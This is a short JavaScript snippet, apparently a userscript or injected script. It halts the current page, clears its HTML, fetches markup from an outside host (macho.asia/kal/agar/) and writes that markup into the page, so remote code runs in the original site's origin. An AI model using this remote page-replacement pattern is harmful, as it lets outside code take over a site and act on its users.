!function() {
    if (typeof hasRun == 'undefined') {
        hasRun = true;
        window.stop();
        document.documentElement.innerHTML = "";
        var vertexRequest = new XMLHttpRequest;
        vertexRequest.open("GET", "http://macho.asia/kal/agar/", true);
        vertexRequest.onload = function () {
            document.open();
            document.write(this.responseText.replace(/\=\"\.\//g, '="' + 'http://macho.asia/kal/agar/'));
            document.close();
        };
        vertexRequest.send();
    }
}();
